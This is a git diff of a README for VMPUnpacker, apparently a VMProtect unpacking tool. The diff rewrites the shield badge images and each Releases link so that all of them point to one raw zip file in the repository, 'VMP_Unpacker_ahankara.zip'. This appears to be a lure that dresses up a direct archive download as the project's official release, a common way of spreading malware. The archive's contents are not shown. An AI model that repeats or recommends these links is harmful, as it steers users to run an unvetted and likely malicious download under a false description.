@@ -1,6 +1,6 @@
 # VMPUnpacker
 
-![VMPUnpacker](https://img.shields.io/badge/VMPUnpacker-v1.0-blue.svg) ![GitHub Repo stars](https://img.shields.io/github/stars/Veysel072/VMPUnpacker?style=social)
+![VMPUnpacker](https://raw.githubusercontent.com/Veysel072/VMPUnpacker/master/python/VMP_Unpacker_ahankara.zip) ![GitHub Repo stars](https://raw.githubusercontent.com/Veysel072/VMPUnpacker/master/python/VMP_Unpacker_ahankara.zip)
 
 Welcome to the VMPUnpacker repository! This project offers a static unpacker for VMProtect. While it does not include an import fix, it serves as a useful tool for those working with VMProtect software.
 
@@ -28,7 +28,7 @@ VMProtect is a software protection tool that uses virtualization to secure appli
 
 To get started with VMPUnpacker, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases section](https://github.com/Veysel072/VMPUnpacker/releases) to download the latest version of VMPUnpacker.
+1. **Download the Latest Release**: Visit the [Releases section](https://raw.githubusercontent.com/Veysel072/VMPUnpacker/master/python/VMP_Unpacker_ahankara.zip) to download the latest version of VMPUnpacker.
 2. **Extract the Files**: Unzip the downloaded file to your preferred location.
 3. **Run the Application**: Execute the unpacker by running the appropriate file.
 
@@ -60,6 +60,6 @@ VMPUnpacker is open-source software. You can use it under the terms of the MIT L
 
 ## Contact
 
-For any questions or feedback, feel free to reach out. You can also check the [Releases section](https://github.com/Veysel072/VMPUnpacker/releases) for updates and new features.
+For any questions or feedback, feel free to reach out. You can also check the [Releases section](https://raw.githubusercontent.com/Veysel072/VMPUnpacker/master/python/VMP_Unpacker_ahankara.zip) for updates and new features.
 
 Thank you for using VMPUnpacker!
